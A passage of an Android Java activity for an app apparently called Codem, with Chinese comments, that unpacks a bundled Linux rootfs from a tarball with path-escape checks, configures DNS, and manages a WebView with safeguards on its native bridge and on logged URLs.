            stdin.write(json.getBytes(StandardCharsets.UTF_8));
        } catch (IOException e) {
            Log.w(TAG, "seed stdin failed: " + e.getMessage());
        }
        try {
            int code = p.waitFor();
            reader.join(3000);
            Log.i(TAG, "seed " + command + " exit=" + code + " out=" + out.toString().trim());
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    private static void copyFile(File src, File dst) throws IOException {
        try (InputStream in = new BufferedInputStream(new java.io.FileInputStream(src));
             OutputStream out = new FileOutputStream(dst)) {
            byte[] buf = new byte[64 * 1024];
            int n;
            while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
        }
    }

    /** 前台服务 + 唤醒锁：关掉界面后 Host 仍常驻（ADR-0002 §3.2） */
    private void startKeepAlive() {
        try {
            startForegroundService(new Intent(this, KeepAliveService.class));
        } catch (Throwable t) {
            // 通知权限/厂商限制不该阻断 Host 启动；失败只记录
            Log.w("codem", "startForegroundService failed", t);
        }
    }

    private File hostLog() {
        return new File(getFilesDir(), "host.log");
    }

    // ===== assets / tar =====

    private void copyGuestLib(File root, String assetName, String... relativePaths) throws IOException {
        for (String rel : relativePaths) {
            File dst = new File(root, rel);
            if (dst.exists()) continue;
            File parent = dst.getParentFile();
            if (parent == null) continue;
            if (!parent.isDirectory()) parent.mkdirs();
            try (InputStream in = new BufferedInputStream(getAssets().open(assetName))) {
                try (OutputStream out = new FileOutputStream(dst)) {
                    byte[] buf = new byte[64 * 1024];
                    int n;
                    while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
                }
            }
        }
    }

    /** 真机实测：rootfs 的 resolv.conf 指向 systemd-resolved（不存在）⇒ 用 Android 当前网络的 DNS 覆写 */
    private void writeDnsConfig(File root) {
        try {
            File etc = new File(root, "etc");
            etc.mkdirs();
            File rc = new File(etc, "resolv.conf");
            if (rc.exists() || rc.getCanonicalPath().length() > 0) rc.delete();
            StringBuilder sb = new StringBuilder();
            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            Network net = cm != null ? cm.getActiveNetwork() : null;
            LinkProperties lp = net != null && cm != null ? cm.getLinkProperties(net) : null;
            if (lp != null) {
                for (InetAddress d : lp.getDnsServers()) {
                    if (d != null && d.getHostAddress() != null) sb.append("nameserver ").append(d.getHostAddress()).append("\n");
                }
            }
            if (sb.length() == 0) sb.append("nameserver 8.8.8.8\nnameserver 1.1.1.1\n");
            Files.write(rc.toPath(), sb.toString().getBytes(StandardCharsets.UTF_8));
        } catch (Throwable t) {
            Log.w(TAG, "write resolv.conf failed", t);
        }
    }

    private void copyAsset(String name, File dst) throws IOException {
        try (InputStream in = new BufferedInputStream(getAssets().open(name));
             OutputStream out = new FileOutputStream(dst)) {
            byte[] buf = new byte[64 * 1024];
            int n;
            while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
        }
    }

    private void extractAsset(String name, File dest) throws IOException {
        mkdirs(dest);
        try (InputStream in = new GZIPInputStream(new BufferedInputStream(getAssets().open(name), 64 * 1024))) {
            untar(in, dest.toPath());
        }
    }

    /** 极简 tar 解析：普通文件 / 目录 / 符号链接 / 硬链接 / PAX 扩展头（path= / linkpath=） */
    private void untar(InputStream in, Path dest) throws IOException {
        byte[] header = new byte[512];
        long total = 0;
        String paxPath = null;
        String paxLink = null;
        while (true) {
            if (!readFully(in, header, 512)) return;
            if (allZero(header)) return;
            String name = cstr(header, 0, 100);
            String prefix = cstr(header, 345, 155);
            if (!prefix.isEmpty()) name = prefix + "/" + name;
            long size = octal(header, 124, 12);
            char type = (char) (header[156] & 0xff);
            long mode = octal(header, 100, 8);
            String link = cstr(header, 157, 100);
            total += size;
            if (total % (5 * 1024 * 1024) < 512) showStatus("解压运行时… " + (total / (1024 * 1024)) + " MB");

            // PAX 扩展头：真正的路径/链接名在数据段里，覆盖下一个条目
            if (type == 'x' || type == 'g' || type == 'L' || type == 'K') {
                byte[] data = new byte[(int) size];
                if (size > 0) readFully(in, data, (int) size);
                skipPadding(in, size);
                String payload = new String(data, StandardCharsets.UTF_8);
                for (String line : payload.split("\n")) {
                    if (line.startsWith("path=")) paxPath = line.substring(5);
                    else if (line.startsWith("linkpath=")) paxLink = line.substring(9);
                }
                continue;
            }

            if (paxPath != null) { name = paxPath; paxPath = null; }
            if (paxLink != null) { link = paxLink; paxLink = null; }

            Path target = dest.resolve(name).normalize();
            if (!target.startsWith(dest)) { skip(in, size); continue; }

            switch (type) {
                case '5':
                    Files.createDirectories(target);
                    break;
                case '2':
                    mkdirs(target.getParent().toFile());
                    try { Files.deleteIfExists(target); } catch (IOException ignored) { }
                    // tar 里的相对链接是**相对于条目所在目录**（如 /usr/bin/sh -> dash），
                    // 不是相对于 rootfs 根；绝对链接则要映射进 rootfs（/bin/sh -> /usr/bin/dash）。
                    Path linkPath = Paths.get(link);
                    Path linkTarget = linkPath.isAbsolute()
                            ? dest.resolve(link.substring(1)).normalize()
                            : target.getParent().resolve(link).normalize();
                    if (!linkTarget.startsWith(dest)) {
                        Log.w(TAG, "symlink escapes rootfs: " + name + " -> " + link);
                        continue;
                    }
                    try { Files.createSymbolicLink(target, linkTarget); } catch (Exception e) {
                        Log.w(TAG, "symlink failed: " + name + " -> " + link);
                    }
                    break;
                case '1':
                    mkdirs(target.getParent().toFile());
                    try { Files.createLink(target, dest.resolve(link)); } catch (Exception e) {
                        // 硬链接不支持就退化为复制（在数据段里，需要读取）
                        writeFile(in, target, size, mode);
                        continue;
                    }
                    break;
                case '0':
                case '7':
                    mkdirs(target.getParent().toFile());
                    writeFile(in, target, size, mode);
                    continue;
                default:
                    break;
            }
            skip(in, size);
        }
    }

    private void writeFile(InputStream in, Path target, long size, long mode) throws IOException {
        try (OutputStream out = new FileOutputStream(target.toFile())) {
            copy(in, out, size);
        }
        skipPadding(in, size);
        try {
            Set<PosixFilePermission> perms = new HashSet<>();
            perms.add(PosixFilePermission.OWNER_READ);
            perms.add(PosixFilePermission.OWNER_WRITE);
            if ((mode & 0100) != 0) perms.add(PosixFilePermission.OWNER_EXECUTE);
            perms.add(PosixFilePermission.GROUP_READ);
            if ((mode & 0010) != 0) perms.add(PosixFilePermission.GROUP_EXECUTE);
            perms.add(PosixFilePermission.OTHERS_READ);
            if ((mode & 0001) != 0) perms.add(PosixFilePermission.OTHERS_EXECUTE);
            Files.setPosixFilePermissions(target, perms);
        } catch (Exception ignored) {
            /* 权限位失败不影响使用（PRoot 用 -0 伪装 root） */
        }
    }

    private void copyFrom(InputStream in, Path target, long size) throws IOException {
        try (OutputStream out = new FileOutputStream(target.toFile())) {
            copy(in, out, size);
        }
    }

    private static void copy(InputStream in, OutputStream out, long size) throws IOException {
        byte[] buf = new byte[64 * 1024];
        long left = size;
        while (left > 0) {
            int n = in.read(buf, 0, (int) Math.min(buf.length, left));
            if (n < 0) return;
            out.write(buf, 0, n);
            left -= n;
        }
    }

    private static void skipPadding(InputStream in, long size) throws IOException {
        long pad = (512 - (size % 512)) % 512;
        while (pad > 0) {
            long n = in.skip(pad);
            if (n <= 0) { in.read(); n = 1; }
            pad -= n;
        }
    }

    private static void skip(InputStream in, long size) throws IOException {
        long left = size;
        while (left > 0) {
            long n = in.skip(left);
            if (n <= 0) { in.read(); n = 1; }
            left -= n;
        }
        long pad = (512 - (size % 512)) % 512;
        while (pad > 0) { long n = in.skip(pad); if (n <= 0) { in.read(); n = 1; } pad -= n; }
    }

    private static boolean readFully(InputStream in, byte[] buf, int len) throws IOException {
        int off = 0;
        while (off < len) {
            int n = in.read(buf, off, len - off);
            if (n < 0) return false;
            off += n;
        }
        return true;
    }

    private static String cstr(byte[] b, int off, int len) {
        int end = off;
        while (end < off + len && b[end] != 0) end++;
        return new String(b, off, end - off, StandardCharsets.UTF_8).trim();
    }

    private static long octal(byte[] b, int off, int len) {
        String s = cstr(b, off, len).trim();
        if (s.isEmpty()) return 0;
        try { return Long.parseLong(s, 8); } catch (NumberFormatException e) { return 0; }
    }

    private static boolean allZero(byte[] b) {
        for (byte x : b) if (x != 0) return false;
        return true;
    }

    // ===== UI helpers =====

    private void showStatus(String text) {
        ui.post(() -> {
            if (status == null) {
                LinearLayout root = new LinearLayout(this);
                root.setOrientation(LinearLayout.VERTICAL);
                root.setPadding(48, 96, 48, 48);
                TextView title = new TextView(this);
                title.setText("Codem");
                title.setTextSize(24);
                root.addView(title);
                status = new TextView(this);
                status.setPadding(0, 24, 0, 0);
                root.addView(status);
                setContentView(root);
            }
            status.setText(text);
        });
    }

    /**
     * 启动失败页。
     *
     * 必须带「设置」入口：Host 起不来（或模型配置写错）时，页面本身是打不开的，
     * 而这正是最需要改配置的时刻 —— 把入口只放在 WebView 里等于把用户锁死。
     */
    private void showError(Exception e) {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(48, 96, 48, 48);
        TextView title = new TextView(this);
        title.setText("启动失败");
        title.setTextSize(24);
        root.addView(title);
        TextView msg = new TextView(this);
        msg.setText(String.valueOf(e.getMessage()) + "\n\n日志：files/host.log");
        msg.setPadding(0, 24, 0, 0);
        root.addView(msg);

        LinearLayout actions = new LinearLayout(this);
        actions.setOrientation(LinearLayout.HORIZONTAL);
        actions.setGravity(Gravity.END);

        Button settings = new Button(this);
        settings.setText("设置");
        settings.setContentDescription("本机模型设置");
        settings.setOnClickListener(v -> showLlmSettings());
        actions.addView(settings);

        Button retry = new Button(this);
        retry.setText("重试");
        retry.setContentDescription("重试启动");
        retry.setOnClickListener(v -> {
            status = null;
            webView = newWebView();
            startLocal();
        });
        LinearLayout.LayoutParams retryLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        retryLp.leftMargin = 16;
        actions.addView(retry, retryLp);

        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.gravity = Gravity.END;
        lp.topMargin = 24;
        root.addView(actions, lp);
        setContentView(root);
    }

    /**
     * 只打开远程（连接电脑）页面：**先移除原生桥**再加载。
     *
     * 顺序不能反：`removeJavascriptInterface` 只对**下一次**加载生效，
     * 所以必须在 `loadUrl` 之前调用；否则远程页面能拿到上一页残留的 `CodemNative`
     * （方法内部还有 origin 复核，但这里少一道就少一道）。
     */
    private void openOnlyWebView(String url) {
        prepareBridgeForLoad(url);
        setContentView(webView);
        Log.i(TAG, "loading " + safeUrlForLog(url));
        webView.loadUrl(url);
    }

    /**
     * 只保留 scheme + host + port + path 的日志形态。
     *
     * 为什么连 query 一起丢：`?token=` 曾经就是从这里进 logcat 的；即使现在原生页不再拼
     * token，带令牌的深链接仍可能把凭据带进这个函数。日志里永远不该出现凭据。
     */
    private static String safeUrlForLog(String url) {
        try {
            java.net.URI u = java.net.URI.create(url);
            StringBuilder sb = new StringBuilder();
            if (u.getScheme() != null) sb.append(u.getScheme()).append("://");
            if (u.getHost() != null) sb.append(u.getHost());
            if (u.getPort() > 0) sb.append(":").append(u.getPort());
            if (u.getPath() != null && !u.getPath().isEmpty()) sb.append(u.getPath());
            return sb.length() == 0 ? "<url>" : sb.toString();
        } catch (Exception e) {
            return "<url>";
        }
    }

    private static void mkdirs(File dir) {
        if (dir != null && !dir.exists() && !dir.mkdirs() && !dir.isDirectory()) {
            Log.w(TAG, "mkdirs failed: " + dir);
        }
    }

    @Override
    protected void onNewIntent(android.content.Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        Log.i(TAG, "onNewIntent extras=" + (intent != null && intent.hasExtra("url")));
        // am start 对「已在顶部的实例」走 onNewIntent，不会回调 onResume：这里必须自己处理
        String url = takeUrlIntent();
        if (url == null) return;
        if (isLoopback(url) && !HostSupervisor.healthy()) {
            pendingUrl = url;
            startLocal();
        } else if (isLoopback(url)) {
            // 旧深链里的 8787 不再可信：重写到当前随机端口，并注入本次启动的凭据
            openLocalTarget(localPathAndQuery(url));
        } else {
            openOnlyWebView(url);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (pendingStorageStart && Build.VERSION.SDK_INT >= 30 && Environment.isExternalStorageManager()) {
            pendingStorageStart = false;
            startInitial();
            return;
        }
        String url = takeUrlIntent();
        if (url == null) return;
        if (isLoopback(url) && !HostSupervisor.healthy()) {
            pendingUrl = url;
            startLocal();
        } else if (isLoopback(url)) {
            openLocalTarget(localPathAndQuery(url));
        } else {
            openOnlyWebView(url);
        }
    }

    /**
     * 设备凭据现在只存在于 HttpOnly cookie 里（`pair.claim` 的 Set-Cookie）。
     *
     * WebView 的 cookie 默认接受并会在后台异步落盘，但进程被系统杀掉时未完成的写入会丢。
     * `onPause` 是普通路径下唯一可靠的落盘点：`am force-stop` 不保证回调它，
     * 所以真机用例走「配对 → 按 Home → force-stop → 重启」而不是直接 force-stop。
     * 这里不清空 cookie、也不动接受开关：那会让每次重启都掉登录。
     */
    @Override
    protected void onPause() {
        super.onPause();
        flushCookies();
    }

    private void flushCookies() {
        try {
            CookieManager.getInstance().flush();
        } catch (RuntimeException e) {
            // 极旧/裁剪 ROM 上 CookieManager 可能不可用；落盘失败不能把 Activity 拖崩
            Log.w(TAG, "cookie flush failed: " + e.getClass().getSimpleName());
        }
    }

    private static boolean isLoopback(String url) {
        if (url == null) return false;
        return url.startsWith("http://127.0.0.1:") || url.startsWith("http://localhost:");
    }

    /**
     * 这个 URL 是不是**当前本机端点**托管的页面（scheme=http + loopback + 端口相同）。
     *
     * 与 `isLoopback` 的区别：后者只用于"要不要按本机流程处理"（旧深链里的 8787 也算），
     * 这里用于**能力授予**（是否注入原生桥），必须精确到本次启动的端口。
     */
    private static boolean isLocalHostPage(String url) {
        if (url == null) return false;
        HostSupervisor.Endpoint ep = HostSupervisor.endpoint();
        if (ep == null) return false;
        try {
            java.net.URI u = java.net.URI.create(url);
            if (!"http".equalsIgnoreCase(u.getScheme())) return false;
            String host = u.getHost();
            if (host == null) return false;
            boolean loopback = "127.0.0.1".equals(host) || "localhost".equals(host) || "::1".equals(host);
            return loopback && u.getPort() == ep.port;
        } catch (Exception e) {
            return false;
        }
    }

    /** 取走 intent 里的 url（取一次后清掉，避免每次 resume 重复加载） */
    private String takeUrlIntent() {
        android.content.Intent intent = getIntent();
        if (intent == null) return null;
        String url = intent.getStringExtra("url");
        Log.i(TAG, "takeUrlIntent url=" + (url == null ? "null" : safeUrlForLog(url)));
        if (url == null || url.isEmpty()) return null;
        boolean selftest = intent.getBooleanExtra("selftest", false);
        intent.removeExtra("url");
        intent.removeExtra("selftest");
        if (selftest) url += (url.contains("?") ? "&" : "?") + "selftest=1";
        return url;
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    @Override
    protected void onDestroy() {
        if (busyDialog != null && busyDialog.isShowing()) busyDialog.dismiss();
        busyDialog = null;
        if (settingsDialog != null && settingsDialog.isShowing()) settingsDialog.dismiss();
        settingsDialog = null;
        if (webView != null) {
            webView.destroy();
            webView = null;
        }
        super.onDestroy();
    }
}
